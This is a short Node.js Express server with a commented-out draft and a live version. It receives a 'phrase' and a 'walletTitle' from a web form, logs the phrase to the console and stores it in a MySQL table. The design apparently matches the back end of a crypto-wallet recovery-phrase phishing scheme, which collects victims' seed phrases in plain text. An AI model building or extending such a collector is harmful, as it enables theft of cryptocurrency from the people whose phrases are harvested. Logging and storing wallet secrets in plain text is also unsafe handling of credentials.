// const express = require("express");
// const cors = require("cors");
// const bodyParser = require("body-parser");

// const app = express();
// const PORT = process.env.PORT || 3000;

// // Middleware
// app.use(cors());
// app.use(bodyParser.urlencoded({ extended: false }));
// app.use(bodyParser.json());

// // Handle form submissions
// app.post("/submit-form", (req, res) => {
//   const { phrase, walletTitle } = req.body;

//   // Process the form data
//   console.log("Received phrase:", phrase);
//   console.log("Selected wallet title:", walletTitle);

//   // Example: Send response
//   res.json({
//     message: "Form data received successfully!",
//     data: { phrase, walletTitle },
//   });

//   // Optionally: Send email, store in database, etc.
// });

// // Start the server
// app.listen(PORT, () => {
//   console.log(`Server is running on http://localhost:${PORT}`);
// });

const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const db = require('./db'); // Import the database configuration

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Handle form submissions
app.post("/submit-form", (req, res) => {
  const { phrase, walletTitle } = req.body;

  // Process the form data
  console.log("Received phrase:", phrase);
  console.log("Selected wallet title:", walletTitle);

  // Insert data into the MySQL database
  const query = 'INSERT INTO form_responses (phrase, walletTitle) VALUES (?, ?)';
  db.query(query, [phrase, walletTitle], (err, results) => {
    if (err) {
      console.error('Error inserting data into MySQL:', err.stack);
      return res.status(500).json({ message: 'Error saving form data' });
    }

    // Send response
    res.json({
      message: "Form data received and stored successfully!",
      data: { phrase, walletTitle },
    });
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
